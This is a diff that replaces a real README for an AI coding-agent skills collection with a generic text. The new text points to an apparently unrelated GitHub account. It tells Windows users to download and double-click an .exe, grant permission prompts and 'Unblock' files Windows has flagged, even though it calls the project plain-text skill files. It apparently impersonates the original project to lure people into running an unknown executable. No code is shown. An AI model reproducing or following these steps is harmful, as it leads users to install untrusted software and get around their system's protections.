@@ -1,98 +1,270 @@
-# MiniMax Skills
+# 🧠 skills - Clear guidance for better builds
 
-[中文版](./README_zh.md)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/martgueritainaccurate875/skills)
 
-> **Beta** — This project is under active development. Skills, APIs, and configuration formats may change without notice. We welcome feedback and contributions.
+## 📦 Download
 
-Development skills for AI coding agents. Plug into your favorite AI coding tool and get structured, production-quality guidance for frontend, fullstack, Android, iOS, and shader development.
+Use this link to visit the download page:
 
-## Skills
+[https://github.com/martgueritainaccurate875/skills](https://github.com/martgueritainaccurate875/skills)
 
-| Skill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | Description | Source |
-|---------------------------------------|-------------|--------|
-| `frontend-dev` | Full-stack frontend development combining premium UI design, cinematic animations (Framer Motion, GSAP), AI-generated media assets via MiniMax API (image, video, audio, music, TTS), persuasive copywriting (AIDA framework), and generative art (p5.js, Three.js, Canvas). Tech stack: React / Next.js, Tailwind CSS. | Official |
-| `fullstack-dev` | Full-stack backend architecture and frontend-backend integration. REST API design, auth flows (JWT, session, OAuth), real-time features (SSE, WebSocket), database integration (SQL / NoSQL), production hardening, and release checklist. Guided workflow: requirements → architecture → implementation. | Official |
-| `android-native-dev` | Android native application development with Material Design 3. Kotlin / Jetpack Compose, adaptive layouts, Gradle configuration, accessibility (WCAG), build troubleshooting, performance optimization, and motion system. | Official |
-| `ios-application-dev` | iOS application development guide covering UIKit, SnapKit, and SwiftUI. Touch targets, safe areas, navigation patterns, Dynamic Type, Dark Mode, accessibility, collection views, and Apple HIG compliance. | Official |
-| `flutter-dev` | Flutter cross-platform development covering widget patterns, Riverpod/Bloc state management, GoRouter navigation, performance optimization, and testing strategies. | Official |
-| `react-native-dev` | React Native and Expo development guide covering components, styling, animations, navigation, state management, forms, networking, performance optimization, testing, native capabilities, and engineering (project structure, deployment, SDK upgrades, CI/CD). | Official |
-| `shader-dev` | Comprehensive GLSL shader techniques for creating stunning visual effects — ray marching, SDF modeling, fluid simulation, particle systems, procedural generation, lighting, post-processing, and more. ShaderToy-compatible. | Official |
-| `gif-sticker-maker` | Convert photos (people, pets, objects, logos) into 4 animated GIF stickers with captions. Funko Pop / Pop Mart style, powered by MiniMax Image & Video Generation API. | Official |
-| `minimax-pdf` | Generate, fill, and reformat PDF documents with a token-based design system. CREATE polished PDFs from scratch (15 cover styles), FILL existing form fields, or REFORMAT documents into a new design. Print-ready output with typography and color derived from document type. | Official |
-| `pptx-generator` | Generate, edit, and read PowerPoint presentations. Create from scratch with PptxGenJS (cover, TOC, content, section divider, summary slides), edit existing PPTX via XML workflows, or extract text with markitdown. | Official |
-| `minimax-xlsx` | Open, create, read, analyze, edit, or validate Excel/spreadsheet files (.xlsx, .xlsm, .csv, .tsv). Covers creating new xlsx from scratch via XML templates, reading and analyzing with pandas, editing existing files with zero format loss, formula recalculation, validation, and professional financial formatting. | Official |
-| `minimax-docx` | Professional DOCX document creation, editing, and formatting using OpenXML SDK (.NET). Three pipelines: create new documents from scratch, fill/edit content in existing documents, or apply template formatting with XSD validation gate-check. | Official |
-| `vision-analysis` | Analyze, describe, and extract information from images using vision AI models. Supports describe, OCR, UI mockup review, chart data extraction, and object detection. Powered by MiniMax VL API with OpenAI GPT-4V fallback. | Community |
-| `minimax-multimodal-toolkit` | Generate voice, music, video, and image content via MiniMax APIs — the unified entry for MiniMax multimodal use cases. Covers TTS (text-to-speech, voice cloning, voice design, multi-segment), music (songs, instrumentals), video (text-to-video, image-to-video, start-end frame, subject reference, templates, long-form multi-scene), image (text-to-image, image-to-image with character reference), and media processing (convert, concat, trim, extract) via FFmpeg. | Official |
+## 🪟 Windows Setup
 
-## Installation
+1. Open the download page in your browser.
+2. Look for the latest release or the main project files.
+3. Download the package for Windows if one is listed.
+4. If the download comes as a `.zip` file, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the main app file or the launch file.
+7. Double-click it to start the app.
+8. If Windows asks for permission, choose **Yes**.
+9. If your browser saves the file in **Downloads**, open that folder first.
 
-### Claude Code
+## 🧩 What skills does
 
-```bash
-claude plugin marketplace add https://github.com/MiniMax-AI/skills
-claude plugin install minimax-skills
-```
+Skills helps AI coding tools give better project guidance. It gives the tool clear steps, patterns, and prompts for common app work.
 
-### Cursor
+Use it when you want help with:
 
-```bash
-git clone https://github.com/MiniMax-AI/skills.git ~/.cursor/minimax-skills
-```
+- Frontend work
+- Full-stack app work
+- Android apps
+- iPhone apps
+- Shader and graphics work
 
-Add to your Cursor settings — point the skills path to `~/.cursor/minimax-skills/skills/`.
-For Windows setup and verification, see [`.cursor-plugin/INSTALL.md`](.cursor-plugin/INSTALL.md).
+It is built for people who want better output from AI coding tools without writing long instructions each time.
 
-### Codex
+## ✨ What you can do with it
 
-```bash
-git clone https://github.com/MiniMax-AI/skills.git ~/.codex/minimax-skills
+- Get structured help for app tasks
+- Keep project advice in one place
+- Use the same guidance across tools
+- Work with frontend, mobile, and graphics projects
+- Save time when you need repeatable steps
+- Keep your work style more consistent
 
-mkdir -p ~/.agents/skills
-ln -s ~/.codex/minimax-skills/skills ~/.agents/skills/minimax-skills
-```
+## 🖥️ What you need
 
-Restart Codex to discover the skills. See [`.codex/INSTALL.md`](.codex/INSTALL.md) for Windows instructions and details.
+For best results on Windows, use:
 
-### OpenCode
+- Windows 10 or Windows 11
+- A modern web browser
+- A stable internet connection
+- Enough free space for the download and extracted files
+- A text editor if you want to view or edit the files
 
-```bash
-git clone https://github.com/MiniMax-AI/skills.git ~/.minimax-skills
+If you plan to use the skills in an AI coding tool, install that tool first and make sure it can load local project files or prompts.
 
-mkdir -p ~/.config/opencode/skills
-ln -s ~/.minimax-skills/skills/* ~/.config/opencode/skills/
-```
+## 📁 Files you may see
 
-Restart OpenCode to discover the skills. See [`.opencode/INSTALL.md`](.opencode/INSTALL.md) for details.
+After downloading and opening the project, you may see files like:
 
-### VS Code
+- `README.md`
+- `README_zh.md`
+- skill folders
+- text files with guidance
+- config files for tools
 
-This repository does not currently ship a standalone VS Code extension.
+These files are plain text in most cases, so they are easy to open in Windows Notepad or another editor.
 
-If you use VS Code, the supported approach is to run one of the supported CLI tools inside the integrated terminal:
-- Codex
-- Claude Code
-- OpenCode
+## 🚀 First-time run
 
-If you want native local-skills configuration from this repo, use Cursor and follow [`.cursor-plugin/INSTALL.md`](.cursor-plugin/INSTALL.md).
+If you only want to view the project content:
 
-## Contributing
+1. Download the files
+2. Extract the archive if needed
+3. Open `README.md`
+4. Read the available skill list
+5. Open the skill files you want to use
 
-We welcome contributions! Before submitting a PR, please read:
+If you want to use the content in an AI coding tool:
 
-- [CONTRIBUTING.md](./CONTRIBUTING.md) — PR format, skill structure requirements, and development guidelines
-- [PR Review Rules](./.claude/skills/pr-review/SKILL.md) — automated validation checks and quality review criteria
+1. Download the project
+2. Place it in a folder you can find again
+3. Open your AI coding tool
+4. Load the project files or paste the skill text into the tool
+5. Follow the guidance for the task you want to complete
 
-You can run the validation script locally before submitting:
+## 🧭 How to use the skills
 
-```bash
-python .claude/skills/pr-review/scripts/validate_skills.py
-```
+Each skill gives focused help for a type of project. You can use them like this:
 
-## ⭐ Star History
+1. Pick the skill that matches your task
+2. Open the skill file
+3. Read the steps and examples
+4. Copy the instructions into your AI tool if needed
+5. Use the output to guide your work
 
-[![Star History Chart](https://api.star-history.com/svg?repos=MiniMax-AI/skills&type=Date)](https://star-history.com/#MiniMax-AI/skills&Date)
+For example, a frontend skill may help with:
 
-## License
+- Page layout
+- Button states
+- Responsive design
+- Animations
+- Media assets
+- Copy for user-facing screens
 
-[MIT](./LICENSE)
+A mobile skill may help with:
+
+- App screens
+- Navigation
+- Form flow
+- Device layout
+- Build steps
+
+A shader skill may help with:
+
+- Visual effects
+- Animation timing
+- Scene setup
+- Color and motion control
+
+## 🔧 Suggested Windows install flow
+
+If the project is provided as a release file:
+
+1. Download the file from the GitHub page
+2. Save it to your desktop or Downloads folder
+3. If it is a `.zip`, extract it
+4. If it is an `.exe`, double-click it
+5. Follow the on-screen steps
+6. Open the app or files after setup finishes
+
+If the project is provided as source files:
+
+1. Download the ZIP from GitHub
+2. Extract it
+3. Open the folder
+4. Read the main README file
+5. Use the skill files in your AI coding tool
+
+## 🛠️ Common use cases
+
+You may want this project if you need help with:
+
+- Building a new web app
+- Improving a landing page
+- Adding motion to a user interface
+- Writing better prompts for app work
+- Planning a mobile app screen flow
+- Creating visual effects for a game or site
+
+## 📚 Skill list
+
+The project includes structured skills for different kinds of development work. One example is:
+
+- `frontend-dev` — helps with frontend work, UI design, motion, media assets, and React or Next.js projects
+
+Other skills in the set may cover related app work such as full-stack, Android, iOS, and shader tasks.
+
+## 🧪 Basic checks after setup
+
+After you download and open the files, check these items:
+
+- The folder opens without errors
+- `README.md` is visible
+- The skill files are readable
+- Your AI tool can access the files
+- The skill you want matches the task you need
+
+## 🗂️ Folder tips
+
+Keep the project in a simple path on Windows, such as:
+
+- `C:\Users\YourName\Downloads\skills`
+- `C:\Users\YourName\Documents\skills`
+
+Use a short folder path. It helps avoid file path problems in other tools.
+
+## 🔒 Safe file handling
+
+When you download any project file:
+
+- Keep the files in one folder
+- Extract archives before opening deep subfolders
+- Do not rename files unless you know they are not linked
+- Use the latest browser download you trust
+- Scan files with Windows Security if you want an extra check
+
+## 📝 How the README files help
+
+The project includes an English README and a Chinese README. The English file is best if you want quick setup steps. The Chinese file helps if you prefer that language.
+
+Use the README file to:
+
+- See the available skills
+- Understand the purpose of each skill
+- Find the right file for your task
+- Match the skill to your AI tool workflow
+
+## 🧰 If Windows blocks the file
+
+If Windows shows a blocked file message:
+
+1. Right-click the file
+2. Open **Properties**
+3. Look for an **Unblock** option
+4. Apply the change if it appears
+5. Try opening the file again
+
+If the file does not open, make sure the download finished fully and the archive extracted without errors.
+
+## 📌 Working with AI coding tools
+
+This project is made for AI coding tools. A simple way to use it is:
+
+1. Open the skill file
+2. Copy the guidance
+3. Paste it into your AI tool
+4. Ask for the task you want
+5. Review the result and adjust as needed
+
+This works well when you want the tool to follow a clear format for design, code, or content tasks.
+
+## 🧭 Typical workflow
+
+A normal workflow may look like this:
+
+1. Download the project from GitHub
+2. Extract the files
+3. Open the skill you need
+4. Load it into your AI tool
+5. Start your project task
+6. Keep the skill file nearby for reference
+
+## 🧷 File types you may handle
+
+You may work with:
+
+- Markdown files
+- Text files
+- Config files
+- Code snippets
+- Asset references
+
+These files are usually light and easy to move on Windows.
+
+## 📍 Download again
+
+If you need the file again, use the same page:
+
+[https://github.com/martgueritainaccurate875/skills](https://github.com/martgueritainaccurate875/skills)
+
+## 🔍 Quick path for non-technical users
+
+1. Open the GitHub link
+2. Download the project
+3. Extract the files
+4. Open the README
+5. Use the skill files in your AI tool
+6. Follow the guidance for your task
+
+## 🧠 Best fit for this project
+
+This project fits users who want:
+
+- Clear project help
+- Repeatable guidance
+- Better output from AI tools
+- A simple way to manage development tasks
+- A folder of ready-made instructions for different app types
